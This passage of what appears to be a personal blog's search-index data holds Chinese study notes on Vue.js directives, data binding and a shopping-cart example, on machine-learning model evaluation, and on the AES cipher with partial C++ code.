src=\"./js/vue.js\">&lt;/script>\n&lt;/head>\n&lt;body>\n    &lt;div id=\"app\">\n        &lt;p>汉语非即时显示&lt;/p>\n        &lt;textarea v-model=\"text\" placeholder=\"输入\">&lt;/textarea>\n        &lt;p>Content1:&#123;&#123; text &#125;&#125;&lt;/p>\n      \n       &lt;p>汉语即时显示&lt;/p>\n        &lt;input type=\"text\" @input=\"handleInput\" placeholder=\"输入2\">\n        &lt;p>Content1:&#123;&#123; text1 &#125;&#125;&lt;/p>\n\n        &lt;p>单选框&lt;/p>\n        &lt;!-- 单选框 -->\n        &lt;input type=\"radio\" v-model=\"picked\" value=\"HTML\" id=\"html\">\n        &lt;label for=\"html\">HTML&lt;/label>\n        &lt;input type=\"radio\" v-model=\"picked\" value=\"JS\" id=\"js\">\n        &lt;label for=\"html\">JavaScript&lt;/label>\n        &lt;input type=\"radio\" v-model=\"picked\" value=\"CSS\" id=\"css\">\n        &lt;label for=\"html\">CSS&lt;/label>\n\n        &lt;span style=\"padding-left: 30px;\">Picked:&#123;&#123; picked &#125;&#125;&lt;/span>\n        &lt;br>\n        &lt;!-- 复选框 -->\n        &lt;p>复选框&lt;/p>\n        &lt;input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"CSS\">\n        &lt;label for=\"css\">CSS&lt;/label>\n        &lt;input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"JS\">\n        &lt;label for=\"\">JS&lt;/label>\n        &lt;input type=\"checkbox\" v-model=\"checked\" id=\"checked\" value=\"HTML\">\n        &lt;label for=\"html\">HTML&lt;/label>\n        &lt;label for=\"checked\">已选：&#123;&#123; checked &#125;&#125;&lt;/label>\n\n        &lt;p>下拉框(单选)&lt;/p>\n        &lt;select v-model=\"selected\">\n            &lt;option>HTML&lt;/option>\n            &lt;option>JS&lt;/option>\n            &lt;option>CSS&lt;/option>\n        &lt;/select>\n        &lt;label for=\"selected\">已选：&#123;&#123; selected &#125;&#125;&lt;/label>\n\n        &lt;p>下拉框(多选)&lt;/p>\n        &lt;select v-model=\"selected1\" multiple>\n            &lt;option>HTML&lt;/option>\n            &lt;option>JS&lt;/option>\n            &lt;option>CSS&lt;/option>\n        &lt;/select>\n        &lt;label for=\"selected1\">已选：&#123;&#123; selected1 &#125;&#125;&lt;/label>\n\n\n    &lt;/div>\n\n    &lt;script>\n        var app=new Vue(&#123;\n            el:\"#app\",\n            data:&#123;\n                text:'',\n                text1:'',\n                picked:'false',\n                checked:[''],\n                selected:'',\n                selected1:['']\n            &#125;,\n            computed:&#123;\n\n            &#125;,\n            methods:&#123;\n                handleInput:function(e)&#123;\n                    this.text1=e.target.value;\n                &#125;\n            &#125;\n        &#125;)\n    &lt;/script>\n&lt;/body>\n&lt;/html>\n\n6.2 绑定值选中显示a,未选中显示b\n&lt;p>复选框：&lt;/p>\n&lt;input type=\"checkbox\" v-model=\"picked2\" :true-value=\"value1\" :false-value=\"value2\">\n&lt;label>复选框：&lt;/label>\n&lt;p>&#123;&#123; picked2 &#125;&#125;&lt;/p>\n&lt;p>Value1:&#123;&#123; value1 &#125;&#125;&lt;/p>\n&lt;p>Value2:&#123;&#123; value2 &#125;&#125;&lt;/p>\n\n\n6.3 修饰符​    1 v-model.lazy 显示数据不是实时改变，回车或者失焦才会改变；\n&lt;p>.lazy&lt;/p>\n  &lt;input type=\"text\" v-model.lazy=\"lazy\">\n  &lt;p>Lazy:&#123;&#123; lazy &#125;&#125;&lt;/p>\n\n​    2 v-model.number 将输入类型转换为Number类型，否则虽然输入的是数字，其实类型是字符串；若是输入字符，不显示；\n&lt;p>.numebr&lt;/p>\n&lt;input v-model.number=\"number\">\n&lt;p>number:&#123;&#123; number &#125;&#125;&lt;/p>\n\n​    3 v-model.trim 去除首尾空白；\n&lt;p>.trim&lt;/p>\n      &lt;input v-model.trim=\"trim\">\n      &lt;p>trim:&#123;&#123; trim &#125;&#125;&lt;/p> \n\n","slug":"Vue.js实战（4）","date":"2020-11-20T10:38:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"0796c745a1223991af2b7b7c760ec975","title":"Vue购物车","content":"//一个购物车实例\n//重点在数据的绑定和computed属性，methods方法在后面的章节\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Document&lt;/title>\n    &lt;script src=\"./js/vue.js\">&lt;/script>\n    &lt;style type=\"text/css\">\n        table &#123;\n            border: 1px solid black;\n        &#125;\n        th&#123;\n            border: 1px solid black;\n        &#125;\n        td&#123;\n            border: 1px solid black;\n        &#125;\n\n    &lt;/style>\n&lt;/head>\n\n&lt;body>\n    &lt;div id=\"app\" v-cloak>\n        &lt;template v-if=\"list.length\">\n            &lt;table>\n                &lt;thead>\n                    &lt;tr>\n                        &lt;th>&lt;/th>\n                        &lt;th>Name&lt;/th>\n                        &lt;th>Price&lt;/th>\n                        &lt;th>Count&lt;/th>\n                        &lt;th>Option&lt;/th>\n                    &lt;/tr>\n                &lt;/thead>\n                &lt;tbody>\n                    &lt;tr v-for=\"(item,index) in list\">\n                        &lt;td>&#123;&#123; index+1 &#125;&#125;&lt;/td>\n                        &lt;td>&#123;&#123; item.name &#125;&#125;&lt;/td>\n                        &lt;td>&#123;&#123; item.price &#125;&#125;&lt;/td>\n                        &lt;td>\n                            &lt;button @click=\"handleReduce(index)\" :disabled=\"item.count === 1\">-&lt;/button>\n                            &#123;&#123; item.count &#125;&#125;\n                            &lt;button @click=\"handleAdd(index)\">+&lt;/button>\n                        &lt;/td>\n                        &lt;td>\n                            &lt;button @click=\"handleRemove(index)\">移除&lt;/button>\n                        &lt;/td>\n                    &lt;/tr>\n                &lt;/tbody>\n            &lt;/table>\n            &lt;div>总价：¥ &#123;&#123; total &#125;&#125;&lt;/div>\n        &lt;/template>\n\n        &lt;div v-else>购物车竟然是空的，快来添加心仪的商品！&lt;/div>\n    &lt;/div>\n\n    &lt;script>\n        var app = new Vue(&#123;\n            el: '#app',\n            data: &#123;\n                list: [\n                    &#123;\n                        id: 1,\n                        name: 'iPhone',\n                        price: 9998,\n                        count: 1,\n                    &#125;,\n                    &#123;\n                        id: 2,\n                        name: 'iPad',\n                        price: 3988,\n                        count: 1,\n                    &#125;,\n                    &#123;\n                        id: 3,\n                        name: 'iWatch',\n                        price: 2599,\n                        count: 1,\n                    &#125;\n                ]\n            &#125;,\n            methods: &#123;\n                handleAdd: function (index) &#123;\n                    this.list[index].count++;\n                &#125;,\n                handleReduce: function (index) &#123;\n                    if (this.list[index].count === 1) &#123;\n                        return;\n                    &#125;\n                    else &#123;\n                        this.list[index].count--;\n                    &#125;\n                &#125;,\n                handleRemove: function (index) &#123;\n                    this.list.splice(index, 1);\n                &#125;\n            &#125;,\n            computed: &#123;\n                total: function () &#123;\n                    var total = 0;\n                    for (var i = 0; i &lt; this.list.length; i++) &#123;\n                        var item = this.list[i];\n                        total += item.price * item.count;\n                    &#125;\n                    return total.toString().replace(/\\B(?=(\\d&#123;3&#125;)+$)/g, ',');\n                &#125;\n            &#125;,\n        &#125;)\n    &lt;/script>\n    &lt;script src=\"../Nowebpack/js/shopping_car.js\">&lt;/script>\n&lt;/body>\n\n&lt;/html>\n\n","slug":"Vue_Shopping_Car","date":"2020-11-20T09:41:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"b9eb314d54f72cf53fff5f618f6807c7","title":"Vue.js实战（3）","content":"Ch5 内置指令5.1 基本指令1.v-cloak网速较慢时，vue.js还没有加载完成，页面会显示空内容，用v-cloak解决；\n&lt;div id=\"app\" cloak>\n    &#123;&#123; content &#125;&#125;\n&lt;/div>\n\n[cloak]&#123;\ndisplay:none;\n&#125;\n\n2.v-once\n仅仅渲染一次，首次渲染后，不在随数据的变化而变化，视为静态内容；\n3.v-if、v-else-if、v-else\n&lt;div id=\"app\">\n    &lt;a v-if=\"status===1\">显示状态1&lt;/a>\n    &lt;a v-else-if=\"status===2\">显示状态2&lt;/a>\n    &lt;a v-else=\"status===3\">显示状态3&lt;/a>\n    //判断多个元素，使用&lt;template>&lt;/template>\n&lt;/div>\n\n一个简单的切换按钮效果\n&lt;div id=\"app\">\n     &lt;template v-if=\"type=== 'name'\">\n         &lt;input type=\"text\" placeholder=\"name\">\n     &lt;/template>\n\n     &lt;template v-else>\n         &lt;input type=\"email\" placeholder=\"xxx@xx.com\">\n     &lt;/template>\n     &lt;button @click=\"changeMode\">切换&lt;/button>\n &lt;/div>\n \n \n &lt;script>\n     var app=new Vue(&#123;\n         el:\"#app\",\n         data:&#123;\n             type:'name',\n         &#125;,\n         methods:&#123;\n             changeMode:function()&#123;\n                 this.type=this.type==='name'?'mail':'name';\n             &#125;\n         &#125;\n     &#125;)\n &lt;/script>\n\n4.v-show:与if基本一致，但是不可以用在’’’&lt;template&gt;&lt;/template&gt;’’’\n区别：v-if只有为true的时候才会编译渲染，而v-show只是css属性切换，一定会编译，适用于经常切换的场合；\n5.v-for：数组遍历及枚举\n&lt;div>\n           &lt;li v-for=\"book in books\">&#123;&#123; book.name &#125;&#125;&lt;/li>\n       &lt;/div>\ndata:&#123;\n\tbooks:[\n&#123; name: '&lt;Book1>' &#125;,\n   &#123; name: '&lt;Book1>' &#125;,\n   &#123; name: '&lt;Book1>' &#125;, \n   ]\n   &#125;,\n\n5.3过滤与排序：使用计算属性返回处理后的数组筛选数据：\ncomputed:&#123;\n       filterBooks:function()&#123;\n           return this.books.filter(function(book)&#123;\n               return book.name.match(/Book2/);\n           &#125;)\n       &#125;\n\n5.4 方法与事件//一个小的计数器\n &lt;div>\n            点击次数：&#123;&#123; counter &#125;&#125;\n            &lt;button @click=\"counter++\">Click&lt;/button>\n            &lt;button @click=\"add10\">Click +10&lt;/button>\n            &lt;button @click=\"reset_counter\">Reset&lt;/button>\n        &lt;/div>\n\n&lt;script>\n     add10:function()&#123;\n                    this.counter+=10;\n                &#125;,\n     reset_counter:function()&#123;\n                     this.counter=0;\n                &#125;\n&lt;/script>\n\n5.4.2 修饰符\n修饰符\n\n\n\n.stop\n.prevent\n.capture\n\n\n\n.self\n.once\n.enter\n\n\n.tab\n.delete\n.esc\n\n\n.space\n.up\n.down\n\n\n","slug":"Vue.js实战（3）","date":"2020-11-20T09:38:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"81ff82f750d6d01e23e791f595547024","title":"Vue.js实战（2）","content":"Ch3 计算属性1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；\n  &lt;div&gt;\n            &#123;&#123; reversedText &#125;&#125;\n        &lt;&#x2F;div&gt;\n\n  &lt;script&gt;\n            data:&#123;\n                text: &#39;123,456&#39;,\n            &#125;,\n            computed:&#123;\n                reversedText: function()&#123;\n                    return this.text.split(&#39;,&#39;).reverse().join(&#39;,&#39;);\n                &#125;\n&lt;&#x2F;script&gt;\n\n2.用法\n计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；\n3.和methods的区别\n&lt;div&gt;\n    &#123;&#123; reversedText &#125;&#125;\n&lt;&#x2F;div&gt;\n\n&lt;scirpt&gt;\n    methods:&#123;\n        reverserText:function()&#123;\n            return this.text.split(&#39;,&#39;).reverser().join(&#39;,&#39;);\n        &#125;\n    &#125;,\n    computed:&#123;\n         reversedText: function()&#123;\n             return this.text.split(&#39;,&#39;).reverse().join(&#39;,&#39;);\n    &#125;\n&lt;&#x2F;scirpt&gt;\n\n两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；\n当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；\nCH4 v-bind及class与style的绑定1.v-bind指令\n&lt;div&gt;\n    &lt;a v-bind:href&#x3D;&quot;url&quot;&gt;链接&lt;&#x2F;a&gt;\n    &lt;img v-bind:src:&#x3D;&quot;imageUrl&quot;&#x2F;&gt;\n\n     &lt;a :href&#x3D;&quot;url&quot;&gt;链接&lt;&#x2F;a&gt;\n    &lt;img :src&#x3D;&quot;imageUrl&quot;&#x2F;&gt;\n&lt;&#x2F;div&gt;\n\n&lt;script&gt;\n    data:&#123;\n        url:&#39;...&#39;,\n        imageUrl:&#39;...&#39;,\n    &#125;\n&lt;&#x2F;script&gt;\n\n2.绑定class的几种方法\n （1）表达式为真，则加载css\n &lt;div :class&#x3D;&quot;&#123; &#39;active&#39;:isActive,&#39;error&#39;:isError &#125;&quot;&gt;&lt;&#x2F;div&gt;\n\n&lt;script&gt;\n data:&#123;\n      isActive: true,\n      isError:false,\n &#125;\n &lt;&#x2F;script&gt;\n\n （2）使用computed\n&lt;div :class&#x3D;&quot;classes&quot;&gt;&lt;&#x2F;div&gt;\n\n&lt;script&gt;\n    computed:function()&#123;\n        return:&#123;\n            active:this.isActive,\n        &#125;\n    &#125;\n&lt;&#x2F;script&gt;\n\n (3)组件上使用\n  &lt;style&gt;\n        .article&#123;\n            color: red;\n        &#125;\n        .active&#123;\n            color: black;\n            font-size: 30px;\n        &#125;\n    &lt;&#x2F;style&gt;\n\n &lt;div id&#x3D;&quot;app&quot;&gt;\n        &lt;my-component :class&#x3D;&quot;&#123; &#39;active&#39;: isActive &#125;&quot;&gt;&lt;&#x2F;my-component&gt;\n    &lt;&#x2F;div&gt;&gt;\n\n&lt;script&gt;\n    Vue.component(&#39;my-component&#39;,&#123;\n        template:&#39;&lt;p class&#x3D;&quot;article&quot;&gt;这是一个组件&lt;&#x2F;p&gt;&#39;\n    &#125;)\n    var app&#x3D;new Vue(&#123;\n        el:&#39;#app&#39;,\n        data:&#123;\n            isActive:true\n        &#125;\n    &#125;)\n&lt;&#x2F;script&gt;\n\n3.绑定内联样式\n&lt;div :style&#x3D;&quot;styles&quot;&gt;\n            这是第二个组件\n        &lt;&#x2F;div&gt;\n\n  data:&#123;\n            isActive:true,\n            styles:&#123;\n                color:&#39;pink&#39;,\n                fontSize: 35 +&#39;px&#39;\n            &#125;\n        &#125;\n\n\n\n","slug":"Vue.js实战（2）","date":"2020-11-18T13:33:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"81ff82f750d6d01e23e791f595547024","title":"Vue.js实战（2）","content":"Ch3 计算属性1.计算属性：遇到复杂的逻辑时，使用计算属性；将所有的计算属性以函数的形式卸载Vue实例的computed属性内，返回计算结果；\n  &lt;div>\n            &#123;&#123; reversedText &#125;&#125;\n        &lt;/div>\n        \n  &lt;script>\n\t        data:&#123;\n                text: '123,456',\n            &#125;,\n            computed:&#123;\n                reversedText: function()&#123;\n                    return this.text.split(',').reverse().join(',');\n                &#125;\n&lt;/script>\n\n2.用法\n计算属性可以依赖多个vue实例的数据，只要其中一个数据发生变化，计算属性就会重新执行，视图也会更新；\n3.和methods的区别\n&lt;div>\n    &#123;&#123; reversedText &#125;&#125;\n&lt;/div>\n\n&lt;scirpt>\n\tmethods:&#123;\n    \treverserText:function()&#123;\n    \t\treturn this.text.split(',').reverser().join(',');\n    \t&#125;\n    &#125;,\n    computed:&#123;\n    \t reversedText: function()&#123;\n         \treturn this.text.split(',').reverse().join(',');\n    &#125;\n&lt;/scirpt>\n\n两者实现了相同的效果，但是计算属性是基于依赖缓存，一个依赖数据发生变化，才会重新取值；methods只要重新渲染，就会调用；\n当遍历大数组和做大量计算时，应使用计算属性，除非不用缓存；\nCH4 v-bind及class与style的绑定1.v-bind指令\n&lt;div>\n    &lt;a v-bind:href=\"url\">链接&lt;/a>\n    &lt;img v-bind:src:=\"imageUrl\"/>\n    \n     &lt;a :href=\"url\">链接&lt;/a>\n    &lt;img :src=\"imageUrl\"/>\n&lt;/div>\n\n&lt;script>\n\tdata:&#123;\n        url:'...',\n        imageUrl:'...',\n    &#125;\n&lt;/script>\n\n2.绑定class的几种方法\n​    （1）表达式为真，则加载css\n      &lt;div :class=\"&#123; 'active':isActive,'error':isError &#125;\">&lt;/div>\n\n  &lt;script>\ndata:&#123;\n           isActive: true,\n           isError:false,\n      &#125;\n      &lt;/script>\n\n​    （2）使用computed\n&lt;div :class=\"classes\">&lt;/div>\n\n&lt;script>\n       computed:function()&#123;\n           return:&#123;\n               active:this.isActive,\n           &#125;\n       &#125;\n&lt;/script>\n\n​    (3)组件上使用\n​    \n  &lt;style>\n        .article&#123;\n            color: red;\n        &#125;\n        .active&#123;\n            color: black;\n            font-size: 30px;\n        &#125;\n    &lt;/style>\n\n &lt;div id=\"app\">\n        &lt;my-component :class=\"&#123; 'active': isActive &#125;\">&lt;/my-component>\n    &lt;/div>>\n\n&lt;script>\n    Vue.component('my-component',&#123;\n        template:'&lt;p class=\"article\">这是一个组件&lt;/p>'\n    &#125;)\n    var app=new Vue(&#123;\n        el:'#app',\n        data:&#123;\n            isActive:true\n        &#125;\n    &#125;)\n&lt;/script>\n\n\n3.绑定内联样式\n&lt;div :style=\"styles\">\n            这是第二个组件\n        &lt;/div>\n        \n  data:&#123;\n            isActive:true,\n            styles:&#123;\n                color:'pink',\n                fontSize: 35 +'px'\n            &#125;\n        &#125;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Ch3 计算属性","date":"2020-11-18T10:03:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"985b984e77e3b26d64df26d91b8f9fd8","title":"Vue.js实战（1）","content":"Ch1功能：\n解耦视图与数据\n可复用组件\n前端路由\n状态管理\n虚拟Dom\n1.MVVM模式（Model-View-View-Model）Ch2一、Vue实例与数据绑定1.数据绑定&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    &lt;title>Document&lt;/title>\n    &lt;script src=\"./js/vue.js\">&lt;/script>\n&lt;/head>\n&lt;body>\n    &lt;div id=\"app\">\n    \t//插值&#123;&#123;&#125;&#125;\n        Welcome to home:&#123;&#123; home &#125;&#125;\n    &lt;/div>\n\n    &lt;script>\n        var app=new Vue(&#123;\n            el:\"#app\",\n            data:&#123;\n                home:' http://www.lishengwang.top',\n            &#125;\n        &#125;)\n    &lt;/script>\n&lt;/body>\n&lt;/html>\n\n2.生命周期​    a.created:完成数据观测，未挂载；\n​    b.mounted：el挂载到实例；\n​    c.beforeDestory：实例销毁前，解绑addEventListener监听事件等；\n3.v-html&lt;span v-html=\"html1\">&lt;/span>\n\n  &lt;script>\n       var app=new Vue(&#123;\n           el:\"#app\",\n           data:&#123;\n               home:' http://www.lishengwang.top',\n               html1:'&lt;a href=\"http://www.lishengwang.top\">Click!&lt;/a>'\n           &#125;\n       &#125;)\n   &lt;/script>\n\n4.filter过滤器&#123;&#123; a|b &#125;&#125;\n\n二、指令与事件​    1.v-if\n&lt;div v-if=\"show\">\n          V-if实例\n&lt;/div>\n      \n data:&#123;\n              show:true\n          &#125;,\n\n​    2.v-bind:绑定数据，随数据变化进行更新\n&lt;a v-bind:href&#x3D;&quot;home&quot;&gt;V-bind&lt;&#x2F;a&gt;\n\n​    3.v-on：绑定事件\n&lt;div v-if=\"show\">\n          V-if实例\n      &lt;/div>\n      &lt;div>\n          &lt;button v-on:click=\"notToShow\">点击隐藏&lt;/button>\n          &lt;button v-on:click=\"toShow\">点击显示&lt;/button>\n      &lt;/div>\n      \n   methods:&#123;\n              notToShow:function()&#123;\n                  this.show=false\n              &#125;,\n              toShow:function()&#123;\n                  this.show=true\n              &#125;\n\n​    4.v-model:绑定数据\n​      \n&lt;div>\n          Name：&#123;&#123; good.name &#125;&#125;\n          Price: &#123;&#123; good.price &#125;&#125;\n          Count: &#123;&#123; good.count &#125;&#125;\n\n          All in: &#123;&#123; all_price &#125;&#125;\n      &lt;/div>\n      &lt;div>\n\n          &lt;span>新价格：&lt;input type=\"text\" v-model=\"good.price\">&lt;/span>\n          &lt;/br>\n          &lt;span>新数量：&lt;input type=\"text\" v-model=\"good.count\">&lt;/span>\n      &lt;/div>\n\n4.语法糖\n​    （1）\n#v-on ===> @\n&lt;button v-on:click=\"notToShow\">点击隐藏&lt;/button>\n&lt;button @click=\"notToShow\">点击隐藏&lt;/button>\n\n#v-bindd ===> :\n&lt;a v-bind:href=\"#\">&lt;/a>\n&lt;a :href=\"#\">&lt;/a>\n\n","slug":"Vue.js实战（1）","date":"2020-11-17T13:33:45.000Z","categories_index":"前端","tags_index":"笔记,VUE,Vue.js实战","author_index":"Martin"},{"id":"51d3872cd56d489d412dadd4338316da","title":"Vue笔记","content":"VUE错误笔记1.Component template should contain exactly one root element. If you are using v-if on multiple element\n解决方法：每个 Component只能有一个div&gt;，所有的代码需要放进这个div中。\n2.错误缩进\n解决方案：关闭缩进报错工具。\nVUE备忘笔记1.Computed Properties与普通方法的区别\ncomputed properties 会把结果“缓存”起来，每次调用对应的Computed Properties如果所依赖的数据没有变动，则使用已经计算好的值；\n2.watch表示监听方法\n可以监控vue对象中数据的变换；\n3.两者比较：\nwatch:&#123;\n              city:function(city_name)&#123;\n                  this.full_address=city_name+'-'+this.street;\n              &#125;,\n              street:function(street_name)&#123;\n                  this.full_address=this.city+'-'+street_name;\n              &#125;\n          &#125;,\n          computed:&#123;\n              full_address1:function()&#123;\n                  return full_address1=this.city+' '+this.street\n              &#125;\n\n4.component命名规则：小写字母+横线\n例子：\nVue.component(&#39;my-component-name&#39;, &#123; &#x2F;*....*&#x2F;&#125;)\n\nW3C规范：\nVue.component(&#39;MyComponentName&#39;, &#123; &#x2F;*....*&#x2F;&#125;)\n\n可以使用&lt;MyConponentName/&gt;调用；\n","slug":"VUE错误笔记","date":"2020-11-11T18:51:45.000Z","categories_index":"前端","tags_index":"笔记,VUE","author_index":"Martin"},{"id":"ef870961e7c441387cc040843089a96b","title":"机器学习-CH2-模型评估与选择","content":"一、经验误差与过拟合\n错误率：E=a/m\n误差：样本真实输出与预测输出之间的差异 a.训练误差 b.测试误差 c.泛化误差\n\n\n注：努力使经验误差最小化；\n过拟合： 将训练样本的特点当作所有样本的一般性质。\n欠拟合：队训练样本的一般性质尚未学好。\n\n二、评估方法\n评估方向：泛化性能、时间开销、存储开销、可解释性等。\n留出法：直接将数据集划分为两个互斥集合；两个集合尽可能保持数分布的一致性；随即划分、重复实验取均值；训练/测试=2：1 ~ 4：1\n交叉验证法：将数据划分为K个大小相似的互斥子集，每次使用k-1个子集作为训练集，余下的作为测试集，最终得到k个结果的均值，k常取：10；\n自助法：假设给定的数据集包含d个样本。该数据集有放回地抽样m次，产生m个样本的训练集。这样原数据样本中的某些样本很可能在该样本集中出现多次。没有进入该训练集的样本最终形成检验集（测试集）；\n注：数据较小使用自助法，数据量足够使用留出法和交叉验证法；\n\n三、性能度量\n性能度量是衡量模型泛化能力的评价标准；\n回归：均方误差\n分类：错误率、精度\n查准率、查全率、F1例：判断得是否正确，在二分类任务中有四种表现形式，还拿西瓜🍉举例：好西瓜判断成好西瓜，判断正确①；好西瓜判断成坏西瓜，判断错误②；坏西瓜判断成好西瓜，判断错误③；坏西瓜判断成坏西瓜，判断正确④；其中，①和④都是判断正确，②和③都是判断错误。错误率和精度是①和④、②和③的综合判断，只有判断正确与否的概念，没有正例反例的区别。查准率P：【真正例样本数】与【预测结果是正例的样本数】的比值。\n\n查全率T：【真正例样本数】与【真实情况是正例的样本数】的比值。注：P-R图（即以查全率做横轴，查准率做纵轴的平面示意图）当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；当曲线有交叉的时候：第一种方法是比较曲线下面积，但值不太容易估算；第二种方法是比较两条曲线的平衡点，平衡点是“查准率=查全率”时的取值，在图中表示为曲线和对角线的交点。平衡点在外侧的曲线的学习器性能优于内侧。\n\nROC与AUC真正例率（TPR）：【真正例样本数】与【真实情况是正例的样本数】的比值。（查全率）假正例率（FPR）：【假正例样本数】与【真实情况是反例的样本数】的比值。ROC图全名“受试者工作特征”，以真正例率为纵轴，以假正例率为横轴。性能度量的方法：绘制ROC曲线当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；当曲线有交叉的时候：比较ROC面积，即AUC。\n代价敏感错误率与代价曲线性能度量的方法：绘制代价曲线代价曲线的横轴是正例概率代价P(+)cost，纵轴是归一化代价 cost_{norm} 。\n\n四、比较检验（见《概率论》）\n二项检验\nt检验\n交叉验证t检验\n5*2交叉检验\n\n五、偏差与方差偏差：期望输出与真实标记的差别。偏差度量学习算法期望预测与真实结果的偏离程度，刻画拟合能力；方差度量同样大小训练集的变动所导致的学习性能的变化，刻画数据扰动的影响；噪声表达学习算法的期望泛化误差的下线，刻画了学习问题本身的难度；偏差-方差窘境：\n","slug":"机器学习-CH2-模型评估与选择","date":"2020-11-07T14:15:45.000Z","categories_index":"计算机科学","tags_index":"机器学习","author_index":"Martin"},{"id":"2040db2ad66b910dd82181cc41a30bd3","title":"机器学习-CH1-绪论","content":"一、引言机器学习致力于研究如何通过计算的手段，利用经验来改善系统性能。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20201105204318313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\n二、基本术语1.数据    训练集=特征+标记\n    测试集=特征+？\n\n2.任务    分类（离散值）：二分类，多分类。\n    回归（连续值）\n    聚类（无标记信息）\n        有无标记信息：\n            a、监督学习：分类、回归\n            b、无监督学习：聚类\n            c、半监督学习：两者结合\n\n3.泛化能力    模型适用于新样本的能力\n\n三、假设空间    N=特征数|*特征可能值数|*样本数+测试样本数\n\n四、归纳偏好    1.学习过程中对某种类型假设的偏好。\n    2.”奥卡姆剃刀“：若有多个假设与观察一致，选最简单的那个。\n\n五、发展1.符号主义学习    决策树、逻辑\n\n2.连接主义    神经网络\n\n3.统计学习    支持向量机、核方法\n\n","slug":"机器学习-CH1-绪论","date":"2020-11-05T12:56:45.000Z","categories_index":"计算机科学","tags_index":"机器学习","author_index":"Martin"},{"id":"c7c51dfefdf602928993bfcdc943bd20","title":"AES算法","content":"AES数学基础1.有限域GF(2^8)AES以字节为单位进行计算，一个字节8bit。\n多项式表示法：01010111———&gt;x^6+x^4+x^2+x^1+x^0\n2.算法的基本运算（1）加法、减法​    异或运算：01010111+10000011=11010100\n（2）乘法​    要计算有限域GF（2^8）上的乘法，需要确定一个GF(2)上的8次不可约多项式(除了1和自身没有任何其他因子)。\n​    对于AES，这个不可约多项式确定为：m(x)=x^8+x^4+x^3+x^1+x^0 (二进制表示：0000000100011011)\n​    在AES乘法中，需要将两数积mod m(x)。\n​    例：01010111*10000011=11000001\n（3）X乘运算 xtime()算法可用于面向字节的乘法运算。\n\n​    根据定义，xtime()运算是最高项指数不大于7的多项式b(x)乘以多项式x的乘法运算\n​    例：b(x)=b7x7+b6x6+b5x5+b4x4+b3x3+b2x2+b1x+b0​    xtime(b(x))=x·b(x)=(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod m(x)​    =(b7x8+b6x7+b5x6+b4x5+b3x4+b2x3+b1x2+b0x )mod (x8+x4+x3+x+1)\n分类讨论：\n（1）当b7=0：\n\n（2）当b7=1：\nAES算法描述1.概述​    分组长度：128bit        密钥长度：128bit、192bit、256bit（密钥长度不同，加密轮数不同）\n​    基于Rijndael算法。\n2.算法原理​    例：\n​    已知：一轮输入状态矩阵：\n​    EA 04 65 85\n​     83 45 5D 96  \n **5C 33 98 B0**\n\n​     F0 2D AD C5\n（1）字节代换：关于字节的非线性变换（利用S盒）。\n代换结果：\n87 F2 4D 97EC 6E 4C 904A C3  46  E78C D8 95  A6\n（2）行位移：将状态矩阵各行进行循环位移​    第一行保持不变，第二行循环左移8bit，第三行循环左移16bit，第四行循环左移24bit\n位移结果：\n87    f2    4d    976e    4c    90    ec       （左1）46    e7    4a    c3        （左2）a6    8c    d8    95        （左3）\n（3）列混淆：将状态矩阵右乘列混淆矩阵，这个过程称为列混淆混淆矩阵：\n\n混淆结果：\n47    40    a3    4c37    d4    70    9f94    e4    3a    42ed    a5    a6    bc\n（4）轮密钥加：用轮密钥矩阵的第 i 列，与上面得到的列混淆矩阵的第 i 列进行异或运算，得到最后的矩阵。3.代码实现（C语言）#include&lt;iostream&gt;\n#include&lt;cstdio&gt;\n#include&lt;cstring&gt;\n#include&lt;algorithm&gt;\n#include&lt;bitset&gt;\nusing namespace std;\n \nint a[4][4] &#x3D; &#123;\n    &#123;0x87, 0xF2, 0x4D, 0x97&#125;,\n    &#123;0xEC, 0x6E, 0x4C, 0x90&#125;,\n    &#123;0x4A, 0xC3, 0x46, 0xE7&#125;,\n    &#123;0x8C, 0xD8, 0x95, 0xA6&#125;\n&#125;;&#x2F;&#x2F;字节代换后的矩阵\nint mixCol[4][4] &#x3D; &#123;\n    &#123;0x02, 0x03, 0x01, 0x01&#125;,\n    &#123;0x01, 0x02, 0x03, 0x01&#125;,\n    &#123;0x01, 0x01, 0x02, 0x03&#125;,\n    &#123;0x03, 0x01, 0x01, 0x02&#125;\n&#125;;&#x2F;&#x2F;列混淆矩阵\nint round_key[4][4] &#x3D; &#123;\n    &#123;0xAC, 0x19, 0x28, 0x57&#125;,\n    &#123;0x77, 0xFA, 0xD1, 0x5C&#125;,\n    &#123;0x66, 0xDC, 0x29, 0x00&#125;,\n    